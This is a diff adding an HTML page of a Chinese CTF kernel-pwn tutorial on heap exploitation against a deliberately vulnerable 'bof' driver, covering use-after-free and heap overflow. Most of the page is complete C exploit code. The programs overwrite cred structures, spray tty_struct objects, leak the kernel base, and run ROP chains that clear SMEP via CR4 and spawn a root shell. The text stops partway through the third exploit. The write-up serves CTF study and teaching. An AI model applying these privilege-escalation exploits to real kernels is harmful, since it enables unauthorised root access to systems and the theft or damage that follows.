@@ -1,0 +1,3025 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTF-PWN 内核堆利用（UAF、heap_overflow、freelist 劫持、offbynull、arbitrary_heap_free、unlink、页级利用） · Y0uYuGe</title>
+<meta name="description" content="目录：参考资料；释放后使用——CPU 绑定、可合并的 cred_jar、exp、不可合并的 cred_jar——利用 tty_struct 劫持程序控制流提权、exp；堆溢出——通过堆布局溢出覆盖 cred、exp、堆溢出 + 堆喷覆盖 seq_operations 以控制内核执行流、exp；任意地址分配（freelist 劫持）——通过 modprobe_path 提权、利用、exp；空字节越界——调试、漏洞利用、poll、初始化、堆喷 poll_list 和 user_key_payload、堆喷 seq...">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/kernel-security">内核安全</a><span class="sep">›</span><a href="/#/endpoint-security/kernel-security/study-notes">学习笔记</a></nav>
+    <h1>CTF-PWN 内核堆利用（UAF、heap_overflow、freelist 劫持、offbynull、arbitrary_heap_free、unlink、页级利用）</h1>
+    <div class="meta"><time>2024-08-26</time><span class="tag">#python</span><span class="tag">#pycharm</span><span class="tag">#Programming Languages</span><span class="tag">#Pwn</span><span class="tag">#CTF</span><span class="tag">#Heap</span></div>
+    <article class="post-body">
+<h1 id="参考资料">参考资料</h1>
+<p><a href="https://blog.wingszeng.top/kernel-pwn-syscall-userfaultfd-and-syscall-setxattr/">https://blog.wingszeng.top/kernel-pwn-syscall-userfaultfd-and-syscall-setxattr/</a>
+<a href="https://blog.csdn.net/qq_45323960/article/details/130660417?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171982506416800211525431%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=171982506416800211525431&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-130660417-null-null.nonecase&utm_term=kernel&spm=1018.2226.3001.4450">https://blog.csdn.net/qq_45323960/article/details/130660417?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171982506416800211525431%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=171982506416800211525431&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>blog</del>first_rank_ecpm_v1~rank_v31_ecpm-2-130660417-null-null.nonecase&amp;utm_term=kernel&amp;spm=1018.2226.3001.4450</a></p>
+<p>本文首发于奇安信攻防社区 <a href="https://forum.butian.net/share/3738">https://forum.butian.net/share/3738</a></p>
+<h1 id="释放后使用use-after-free">释放后使用（Use After Free）</h1>
+<p>例题：<code>heap bof</code> 
+开启了 kaslr、smep 和 smap。</p>
+<p>cred 结构体大小为 0xa8。根据 slub 的分配机制，如果先分配并释放一个大小为 0xa8（实际为 0xe0）的内存块，再创建新线程，那么该线程的 cred 结构体恰好就是刚刚释放的内存块。利用 UAF 漏洞修改 cred，即可实现提权。</p>
+<p>不过，在较新版本中，cred_jar 不再与其他相同大小的 slab 合并；释放的 cred 结构体只会归还 cred_jar，不会合并到其他 slab 中。</p>
+<p>这是因为创建 cred_jar 时设置了 SLAB_ACCOUNT 标志。当 CONFIG_MEMCG_KMEM=y（默认开启）时，cred_jar 不再与同样大小的 kmalloc-192 合并（可以理解为 cred_jar 需要单独统计内存使用量，因此不允许与其他 slab 合并）。</p>
+<p>给出了源码</p>
+<pre><code class="language-c">#include &lt;asm/uaccess.h&gt;
+#include &lt;linux/cdev.h&gt;
+#include &lt;linux/device.h&gt;
+#include &lt;linux/fs.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;linux/slab.h&gt;
+#include &lt;linux/types.h&gt;
+
+struct class *bof_class;
+struct cdev cdev;
+int bof_major = 256;
+char *ptr[40];// 指针数组，用于存放分配的指针
+struct param { 
+    size_t len;       // 内容长度
+    char *buf;        // 用户态缓冲区地址
+    unsigned long idx;// 表示 ptr 数组的 索引
+};
+
+long bof_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
+    struct param p_arg;
+    copy_from_user(&amp;p_arg, (void *) arg, sizeof(struct param));
+    long retval = 0;
+    switch (cmd) {
+        case 9:
+            copy_to_user(p_arg.buf, ptr[p_arg.idx], p_arg.len);
+            printk(&quot;copy_to_user: 0x%lx\n&quot;, *(long *) ptr[p_arg.idx]);
+            break;
+        case 8:
+            copy_from_user(ptr[p_arg.idx], p_arg.buf, p_arg.len);
+            break;
+        case 7:
+            kfree(ptr[p_arg.idx]);
+            printk(&quot;free: 0x%p\n&quot;, ptr[p_arg.idx]);
+            break;
+        case 5:
+            ptr[p_arg.idx] = kmalloc(p_arg.len, GFP_KERNEL);
+            printk(&quot;alloc: 0x%p, size: %2lx\n&quot;, ptr[p_arg.idx], p_arg.len);
+            break;
+        default:
+            retval = -1;
+            break;
+    }
+    return retval;
+}
+
+static const struct file_operations bof_fops = {
+        .owner = THIS_MODULE,
+        .unlocked_ioctl = bof_ioctl,//linux 2.6.36内核之后unlocked_ioctl取代ioctl
+};
+
+static int bof_init(void) {
+    //设备号
+    dev_t devno = MKDEV(bof_major, 0);
+    int result;
+    if (bof_major)//静态分配设备号
+        result = register_chrdev_region(devno, 1, &quot;bof&quot;);
+    else {//动态分配设备号
+        result = alloc_chrdev_region(&amp;devno, 0, 1, &quot;bof&quot;);
+        bof_major = MAJOR(devno);
+    }
+    printk(&quot;bof_major /dev/bof: %d\n&quot;, bof_major);
+    if (result &lt; 0) return result;
+    bof_class = class_create(THIS_MODULE, &quot;bof&quot;);
+    device_create(bof_class, NULL, devno, NULL, &quot;bof&quot;);
+    cdev_init(&amp;cdev, &amp;bof_fops);
+    cdev.owner = THIS_MODULE;
+    cdev_add(&amp;cdev, devno, 1);
+    return 0;
+}
+
+static void bof_exit(void) {
+    cdev_del(&amp;cdev);
+    device_destroy(bof_class, MKDEV(bof_major, 0));
+    class_destroy(bof_class);
+    unregister_chrdev_region(MKDEV(bof_major, 0), 1);
+    printk(&quot;bof exit success\n&quot;);
+}
+
+MODULE_AUTHOR(&quot;exp_ttt&quot;);
+MODULE_LICENSE(&quot;GPL&quot;);
+module_init(bof_init);
+module_exit(bof_exit);
+</code></pre>
+<p>通过 p_arg.idx 选择 chunk，kfree 后没有清空指针，因此还可以通过 case 9 和 case 8 再次使用。如果释放的 chunk 被重新分配，并存入与内核地址相关的内容，那么 <code>case 9: copy_to_user</code> 就可以将该内核地址复制到用户空间，从而泄露内核地址。另外，case 8 没有长度限制，长度由用户输入决定，因此还存在堆溢出。</p>
+<h2 id="cpu-绑定">CPU 绑定</h2>
+<p>注意：由于开启了 <code>-smp cores=2,threads=2 \</code>，CPU 切换会导致 kmalloc-cache-cpu 切换，因此新分配的对象不一定是刚刚 kfree 的那个。所以需要将进程绑定到一个 CPU 核心上。不绑定也有一定概率成功。</p>
+<pre><code class="language-c">#define __USE_GNU
+#include &lt;sched.h&gt;
+/* to run the exp on the specific core only */
+void bind_cpu(int core)
+{
+    cpu_set_t cpu_set;
+
+    CPU_ZERO(&amp;cpu_set);
+    CPU_SET(core, &amp;cpu_set);
+    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);
+}
+bind_cpu(sched_getcpu());
+</code></pre>
+<h2 id="cred_jar-可以合并">cred_jar 可以合并</h2>
+<p>此时 cred chunk 与相同大小的 chunk 没有区分，因此可以通过刚刚释放的同大小 chunk 得到 cred。</p>
+<p>所以先释放一个与 cred 大小相同的堆块，再创建子线程；子线程的 cred 就会占用刚才释放的 chunk。然后通过 case 8 修改之前释放的 chunk，覆盖 cred 结构体，将其中的 uid 和 gid 设为 0。</p>
+<pre><code class="language-c"> 4.5 kernel/cred.c
+
+void __init cred_init(void)
+{
+	/* allocate a slab in which we can store credentials */
+	cred_jar = kmem_cache_create(&quot;cred_jar&quot;, sizeof(struct cred), 0,
+			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
+}
+
+本题（4.4.72）：
+
+void __init cred_init(void)
+{
+	/* allocate a slab in which we can store credentials */
+	cred_jar = kmem_cache_create(&quot;cred_jar&quot;, sizeof(struct cred),
+				     0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
+}
+</code></pre>
+<h3 id="exp">exp</h3>
+<blockquote>
+<p>注意：这里在用户空间定义 <code>struct param *p_arg;</code> 不行，因为内核中的 <code>copy_from_user(&amp;p_arg, (void *) arg, sizeof(struct param));</code> 是从传入地址复制内容。如果是 <code>struct param *p_arg</code>，传入的只是一个用户空间指针；而使用 <code>struct param p_arg</code> 时，传入的是 <code>&amp;p_arg</code>，p_arg 相关变量会放到栈上。</p>
+</blockquote>
+<pre><code class="language-c">#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+
+struct param {
+    size_t len;       // 内容长度
+    char *buf;        // 用户态缓冲区地址
+    unsigned long idx;// 表示 ptr 数组的 索引
+};
+struct param p_arg;
+
+
+int main(){
+    int fd1=open(&quot;/dev/bof&quot;, O_RDWR);
+
+    p_arg.len=0xa8;
+    p_arg.buf=malloc(0xa8);
+    p_arg.idx=0;
+
+    ioctl(fd1,5,&amp;p_arg);
+    ioctl(fd1,7,&amp;p_arg);
+    if(!fork())
+    {   
+        p_arg.len=0x28;
+        p_arg.buf=malloc(0x28);
+        p_arg.idx=0;
+        memset(p_arg.buf,0,p_arg.len);
+        ioctl(fd1,8,&amp;p_arg);
+        if (getuid()==0)
+        {
+             puts(&quot;[+]root success&quot;);
+            system(&quot;/bin/sh&quot;);
+        }
+    }
+    else {
+        wait(NULL);
+    }
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-001-9110b3d6f1.png" alt="图片"></p>
+<h2 id="cred_jar-不可合并">cred_jar 不可合并</h2>
+<h3 id="利用-tty_struct-劫持程序控制流提权">利用 tty_struct 劫持程序控制流提权</h3>
+<p><a href="https://bbs.kanxue.com/thread-270081.htm#msg_header_h1_2">https://bbs.kanxue.com/thread-270081.htm#msg_header_h1_2</a></p>
+<blockquote>
+<p>tty_struct 结构体位于 include/linux/tty.h，tty_operations 位于 include/linux/tty_driver.h。</p>
+</blockquote>
+<p> /dev 下有一个伪终端设备 ptmx。调用 open(&quot;/dev/ptmx&quot;) 时，会从 kmalloc-1k 中分配一个 tty_struct（0x2b8）。与其他类型设备一样，tty 驱动中也包含一个函数指针结构体：tty_operations。</p>
+<pre><code class="language-c">struct tty_struct {
+    int magic;
+    struct kref kref;
+    struct device *dev;
+    struct tty_driver *driver;
+    const struct tty_operations *ops;
+    int index;
+ 
+    /* Protects ldisc changes: Lock tty not pty */
+    struct ld_semaphore ldisc_sem;
+    struct tty_ldisc *ldisc;
+ 
+    struct mutex atomic_write_lock;
+    struct mutex legacy_mutex;
+    struct mutex throttle_mutex;
+    struct rw_semaphore termios_rwsem;
+    struct mutex winsize_mutex;
+    spinlock_t ctrl_lock;
+    spinlock_t flow_lock;
+    /* Termios values are protected by the termios rwsem */
+    struct ktermios termios, termios_locked;
+    struct termiox *termiox; /* May be NULL for unsupported */
+    char name[64];
+    struct pid *pgrp; /* Protected by ctrl lock */
+    struct pid *session;
+    unsigned long flags;
+    int count;
+    struct winsize winsize; /* winsize_mutex */
+    unsigned long stopped:1, /* flow_lock */
+        flow_stopped:1,
+        unused:BITS_PER_LONG - 2;
+    int hw_stopped;
+    unsigned long ctrl_status:8, /* ctrl_lock */
+        packet:1,
+        unused_ctrl:BITS_PER_LONG - 9;
+    unsigned int receive_room; /* Bytes free for queue */
+    int flow_change;
+ 
+    struct tty_struct *link;
+    struct fasync_struct *fasync;
+    int alt_speed; /* For magic substitution of 38400 bps */
+    wait_queue_head_t write_wait;
+    wait_queue_head_t read_wait;
+    struct work_struct hangup_work;
+    void *disc_data;
+    void *driver_data;
+    struct list_head tty_files;
+ 
+#define N_TTY_BUF_SIZE 4096
+ 
+    int closing;
+    unsigned char *write_buf;
+    int write_cnt;
+    /* If the tty has a pending do_SAK, queue it here - akpm */
+    struct work_struct SAK_work;
+    struct tty_port *port;
+};
+
+struct tty_operations {
+    struct tty_struct * (*lookup)(struct tty_driver *driver,
+    struct inode *inode, int idx);
+    int (*install)(struct tty_driver *driver, struct tty_struct *tty);
+    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+    int (*open)(struct tty_struct * tty, struct file * filp);
+    void (*close)(struct tty_struct * tty, struct file * filp);
+    void (*shutdown)(struct tty_struct *tty);
+    void (*cleanup)(struct tty_struct *tty);
+    int (*write)(struct tty_struct * tty,
+        const unsigned char *buf, int count);
+    int (*put_char)(struct tty_struct *tty, unsigned char ch);
+    void (*flush_chars)(struct tty_struct *tty);
+    int (*write_room)(struct tty_struct *tty);
+    int (*chars_in_buffer)(struct tty_struct *tty);
+    int (*ioctl)(struct tty_struct *tty,
+        unsigned int cmd, unsigned long arg);
+    long (*compat_ioctl)(struct tty_struct *tty,
+        unsigned int cmd, unsigned long arg);
+    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+    void (*throttle)(struct tty_struct * tty);
+    void (*unthrottle)(struct tty_struct * tty);
+    void (*stop)(struct tty_struct *tty);
+    void (*start)(struct tty_struct *tty);
+    void (*hangup)(struct tty_struct *tty);
+    int (*break_ctl)(struct tty_struct *tty, int state);
+    void (*flush_buffer)(struct tty_struct *tty);
+    void (*set_ldisc)(struct tty_struct *tty);
+    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+    void (*send_xchar)(struct tty_struct *tty, char ch);
+    int (*tiocmget)(struct tty_struct *tty);
+    int (*tiocmset)(struct tty_struct *tty,
+        unsigned int set, unsigned int clear);
+    int (*resize)(struct tty_struct *tty, struct winsize *ws);
+    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
+    int (*get_icount)(struct tty_struct *tty,
+    struct serial_icounter_struct *icount);
+#ifdef CONFIG_CONSOLE_POLL
+    int (*poll_init)(struct tty_driver *driver, int line, char *options);
+    int (*poll_get_char)(struct tty_driver *driver, int line);
+    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
+#endif
+    const struct file_operations *proc_fops;
+};
+</code></pre>
+<p>其中 magic 字段为魔数，值为 0x5401。</p>
+<p>使用 tty 设备的前提是挂载 ptmx 设备。</p>
+<pre><code class="language-bash">
+mkdir /dev/pts
+mount -t devpts none /dev/pts
+chmod 777 /dev/ptmx
+</code></pre>
+<ul>
+<li><p>泄露内核基址
+需要读原语。可以利用偏移 0x18 处的 ops = ptm_unix98_ops：关闭 kaslr 时，从 kallsyms 中读出 ptm_unix98_ops；泄露的地址减去它，即可得到内核基址。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-002-0d574034b1.png" alt="图片"></p>
+</li>
+<li><p>泄露 kmalloc-1k 堆地址
+需要读原语。可以利用偏移 0x38 处的链表指针，该指针初始时指向自身。读出后减去 0x38，即为当前 tty_struct 的地址，也就是某个 kmalloc-1k 堆地址。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-003-38b16eec63.png" alt="图片"></p>
+</li>
+<li><p>劫持程序流程
+需要写原语，将 ops 覆盖为伪造的 tty_operations。由于 tty_operations 结构体中的某个函数指针只能写入一个 gadget，除了使用 pt_regs + ret2dir，还可以利用 tty_struct 调用 tty_operations 中函数指针的特点。</p>
+</li>
+<li><p>write (tty_write-&gt;do_tty_write-&gt;n_tty_write-&gt;pty_write)
+例如使用 write：跳转到 write 时（断点下在 pty_write），观察寄存器会发现 rax 为 tty_struct.ops。可以寻找 mov rsp, rax 一类的 gadget 进行栈迁移，这样就能将 tty_struct.ops 之前的数据覆盖为 ROP。不过，这里的空间有些小，放不下 ROP，因此还需要再次进行栈迁移。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-004-514f4e212e.png" alt="图片">
+但需要注意，劫持 write 会触发 tty 魔数检查。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-005-01c5fc8b17.png" alt="图片"></p>
+</li>
+<li><p>ioctl （tty_ioctl-&gt;pty_unix98_ioctl）
+也可以使用 ioctl，通过传入参数控制某些寄存器的值。注意，使用 ioctl 时魔数必须正确，driver 必须是内核堆地址。
+执行到这里时，rbp = &amp;tty_struct（有时 rbp 并不是 &amp;tty_struct）。如果将 tty-&gt;op-&gt;ioctl 设为 <code>leave; ret</code>，就会先将栈迁移到 &amp;tty_struct + 0x8。将这里设为 <code>pop rsp; ret</code>，再将 &amp;tty_struct + 0x10（.driver）设为已布置 ROP 链的内核堆地址，就能完成第二次栈迁移。</p>
+<p>此外，此时 rax 是 pty_unix98_ioctl 函数的地址。如果使用 <code>xchg eax, esp; ret</code>，栈会迁移到 rax &amp; 0xffffffff，落在用户空间。此时可以在用户空间 mmap 一条 ROP 链，但要求关闭 smap。</p>
+</li>
+</ul>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-006-38f032de10.png" alt="图片"></p>
+<ul>
+<li>可以发现，此时 rdi 恰好是 tty_struct 的地址，也能用于利用。</li>
+</ul>
+<p>这里将 tty_operations 覆盖为用户空间伪造的 tty_operations，因此必须关闭 smap。</p>
+<ul>
+<li>如果开启了 smap 呢？由于其他部分可控，只需保证 tty_operations 位于内核中。可以将 ops 函数表指针覆盖为 tty_addr + 0x20 - 0x60，使 ioctl 指向 tty_addr + 0x20，而这个位置是可控的。在这里放入栈迁移 gadget 的地址即可，其他函数同理。</li>
+</ul>
+<blockquote>
+<p>对 write，建议将 ROP 链构造在 op 上；对 ioctl，可以将 ROP 链构造在 tty 上。</p>
+</blockquote>
+<h3 id="exp-1">exp</h3>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+size_t pop_rdi_ret = 0xffffffff8109047d;
+size_t mov_cr4_rdi_pop_rbp_ret = 0xffffffff81004d70;
+size_t swapgs_pop_rbp_ret = 0xffffffff81063654;
+size_t iretq = 0xffffffff8107c0a6;
+size_t xchg_eax_esp_ret = 0xffffffff8100008a;
+
+struct tty_operations {
+    struct tty_struct *(*lookup)(struct tty_driver *driver, struct file *filp, int idx);
+
+    int (*install)(struct tty_driver *driver, struct tty_struct *tty);
+
+    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+
+    int (*open)(struct tty_struct *tty, struct file *filp);
+
+    void (*close)(struct tty_struct *tty, struct file *filp);
+
+    void (*shutdown)(struct tty_struct *tty);
+
+    void (*cleanup)(struct tty_struct *tty);
+
+    int (*write)(struct tty_struct *tty, const unsigned char *buf, int count);
+
+    int (*put_char)(struct tty_struct *tty, unsigned char ch);
+
+    void (*flush_chars)(struct tty_struct *tty);
+
+    int (*write_room)(struct tty_struct *tty);
+
+    int (*chars_in_buffer)(struct tty_struct *tty);
+
+    int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
+
+    long (*compat_ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
+
+    void (*set_termios)(struct tty_struct *tty, struct ktermios *old);
+
+    void (*throttle)(struct tty_struct *tty);
+
+    void (*unthrottle)(struct tty_struct *tty);
+
+    void (*stop)(struct tty_struct *tty);
+
+    void (*start)(struct tty_struct *tty);
+
+    void (*hangup)(struct tty_struct *tty);
+
+    int (*break_ctl)(struct tty_struct *tty, int state);
+
+    void (*flush_buffer)(struct tty_struct *tty);
+
+    void (*set_ldisc)(struct tty_struct *tty);
+
+    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+
+    void (*send_xchar)(struct tty_struct *tty, char ch);
+
+    int (*tiocmget)(struct tty_struct *tty);
+
+    int (*tiocmset)(struct tty_struct *tty, unsigned int set, unsigned int clear);
+
+    int (*resize)(struct tty_struct *tty, struct winsize *ws);
+
+    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
+
+    int (*get_icount)(struct tty_struct *tty, struct serial_icounter_struct *icount);
+
+    const struct file_operations *proc_fops;
+};
+
+struct param {
+    size_t len;
+    char *buf;
+    long long idx;
+};
+#define KERNCALL __attribute__((regparm(3)))
+
+void *(*prepare_kernel_cred)(void *)KERNCALL =(void *) 0xffffffff810a1730;
+
+void *(*commit_creds)(void *)KERNCALL =(void *) 0xffffffff810a1340;
+
+void get_shell() { system(&quot;/bin/sh&quot;); }
+
+void get_root() { commit_creds(prepare_kernel_cred(0)); }
+
+size_t user_cs, user_rflags, user_sp, user_ss;
+
+void save_status() {
+    __asm__(&quot;mov user_cs, cs;&quot;
+            &quot;mov user_ss, ss;&quot;
+            &quot;mov user_sp, rsp;&quot;
+            &quot;pushf;&quot;
+            &quot;pop user_rflags;&quot;
+            );
+    puts(&quot;[*] status has been saved.&quot;);
+}
+
+#define __USE_GNU
+
+#include &lt;sched.h&gt;
+
+void bind_cpu(int core) {
+    cpu_set_t cpu_set;
+
+    CPU_ZERO(&amp;cpu_set);
+    CPU_SET(core, &amp;cpu_set);
+    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);
+}
+
+const int BOF_NUM = 40;
+const int PTMX_NUM = 0x100;
+
+int main() {
+    bind_cpu(sched_getcpu());
+
+    int bof_fd = open(&quot;/dev/bof&quot;, O_RDWR);
+    if (bof_fd == -1) {
+        puts(&quot;[-] open bof device failed!&quot;);
+        return -1;
+    }
+
+    struct param p;
+    p.buf = malloc(p.len = 0x2e0);
+
+    // 让驱动分配 BOF_NUM 个 0x2e0  的内存块
+    for (p.idx = BOF_NUM - 1; p.idx &gt;= 0; p.idx--) {
+        ioctl(bof_fd, 5, &amp;p); // malloc
+    }
+
+    // 释放 BOF_NUM 个申请的内存块
+    for (p.idx = BOF_NUM - 1; p.idx &gt;= 0; p.idx--) {
+        ioctl(bof_fd, 7, &amp;p);  // free
+    }
+
+    // 批量 open /dev/ptmx, 喷射 tty_struct
+    int ptmx_fds[PTMX_NUM];
+    for (int i = 0; i &lt; PTMX_NUM; ++i) {
+        ptmx_fds[i] = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);
+        if (ptmx_fds[i] == -1) {
+            puts(&quot;[-] open ptmx err&quot;);
+        }
+    }
+
+    p.idx = 0;
+    ioctl(bof_fd, 9, &amp;p);
+    // 此时如果释放后的内存被 tty_struct 占用，那么他的开始字节序列应该为 1 54  0  0  1  0  0  0  0  0  0  0  0  0  0  0
+    for (int i = 0; i &lt; 16; ++i) {
+        printf(&quot;%2x%c&quot;, p.buf[i], i == 15 ? &#39;\n&#39; : &#39; &#39;);
+    }
+
+    // 利用 tty_operations 指针泄露内核基址
+    size_t offset = (*(size_t *) &amp;p.buf[0x18]) - 0xffffffff81a8b020;
+    printf(&quot;[*] offset: %p\n&quot;, offset);
+    commit_creds = (void *) ((size_t) commit_creds + offset);
+    prepare_kernel_cred = (void *) ((size_t) prepare_kernel_cred + offset);
+    pop_rdi_ret += offset;
+    mov_cr4_rdi_pop_rbp_ret += offset;
+    swapgs_pop_rbp_ret += offset;
+    iretq += offset;
+    xchg_eax_esp_ret += offset;
+
+    // 伪造 tty_operations 结构体
+    struct tty_operations *fake_tty_operations = (struct tty_operations *) malloc(sizeof(struct tty_operations));
+    memset(fake_tty_operations, 0, sizeof(struct tty_operations));
+    fake_tty_operations-&gt;ioctl = (void *) xchg_eax_esp_ret;
+    fake_tty_operations-&gt;close = (void *) xchg_eax_esp_ret;
+
+    // 布局 rop 链
+    save_status();
+    size_t rop_chain[] = {
+            pop_rdi_ret,
+            0x6f0,
+            mov_cr4_rdi_pop_rbp_ret,
+            0,
+            (size_t) get_root,
+            swapgs_pop_rbp_ret,
+            0,//padding
+            iretq,
+            (size_t) get_shell,
+            user_cs,
+            user_rflags,
+            user_sp,
+            user_ss
+    };
+
+    // 触发漏洞前先把 rop 链拷贝到 mmap_base
+    void *mmap_base = (void *) (xchg_eax_esp_ret &amp; 0xffffffff);
+    void *mmap_addr = mmap(mmap_base - 0x1000, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    printf(&quot;[*] mmap_addr: %p\n&quot;, mmap_addr);
+    memset(mmap_addr, 0, 0x30000);
+    memcpy(mmap_base, rop_chain, sizeof(rop_chain));
+
+    // 批量修改 tty_struct 的 ops 指针
+    *(size_t *) &amp;p.buf[0x18] = (size_t) fake_tty_operations;
+    for (p.idx = 0; p.idx &lt; BOF_NUM; p.idx++) {
+        ioctl(bof_fd, 8, &amp;p);
+    }
+
+    // 调用 tty_operations.ioctl 和 tty_operations.close 触发漏洞
+    for (int i = 0; i &lt; PTMX_NUM; ++i) {
+        ioctl(ptmx_fds[i], 0, 0);
+    }
+
+    return 0;
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-007-3a529ddfd7.png" alt="图片"></p>
+<h1 id="堆溢出">堆溢出</h1>
+<p><a href="https://www.cnblogs.com/arnoldlu/p/10769376.html">查看 slab 缓存使用情况</a>——也可以使用 sudo slabtop 动态查看。</p>
+<h2 id="通过堆布局溢出修改-cred">通过堆布局溢出修改 cred</h2>
+<p>通过溢出覆盖 cred，与前面 UAF 修改 cred 一样，在较新版本中已不可行，因为它们不在同一个 cache 中，内存不一定相邻。</p>
+<p>kalloc 会自动调整大小，可以查看 /proc/slabinfo；通常会向上取整。
+这里一般利用分配大小与 cred 大小落入同一个 kmem-cache 的特点。大量分配，使 slub freelist 中的对象地址保持连续，接下来的两个对象也就相邻，从而实现溢出。或者从 kmem-cache 中分配大量相同大小的对象，再释放其中一个；随后 fork 就可能分配到刚刚释放的那个，而释放对象之前的 chunk 就与它相邻。</p>
+<h3 id="exp-2">exp</h3>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/wait.h&gt;
+
+struct param {
+    size_t len;    // 内容长度
+    char *buf;     // 用户态缓冲区地址
+    long long idx; // 表示 ptr 数组的 索引
+};
+
+int main(void) {
+    int bof_fd = open(&quot;/dev/bof&quot;, O_RDWR);
+    if (bof_fd == -1) {
+        puts(&quot;[-] Failed to open bof device.&quot;);
+        exit(-1);
+    }
+    struct param p = {0xa8, malloc(0xa8), 0};
+    ioctl(bof_fd, 5, &amp;p);  // malloc
+    
+    puts(&quot;[*] clear heap done&quot;);
+
+    p.idx=1;
+    ioctl(bof_fd, 5, &amp;p);  // malloc
+    
+    ioctl(bof_fd, 7, &amp;p); // free
+
+    int pid = fork();
+    if (pid &lt; 0) {
+        puts(&quot;[-] fork error&quot;);
+        exit(-1);
+    }
+
+   p.len=0xc0 + 0x28;
+   p.buf=malloc( 0xc0 + 0x28);
+   p.idx=0;
+    memset(p.buf, 0, p.len);
+    ioctl(bof_fd, 8, &amp;p);
+    if (!pid) {
+        size_t uid = getuid();
+        printf(&quot;[*] uid: %zx\n&quot;, uid);
+        if (!uid) {
+            puts(&quot;[+] root success&quot;);
+            system(&quot;/bin/sh&quot;);
+        } else {
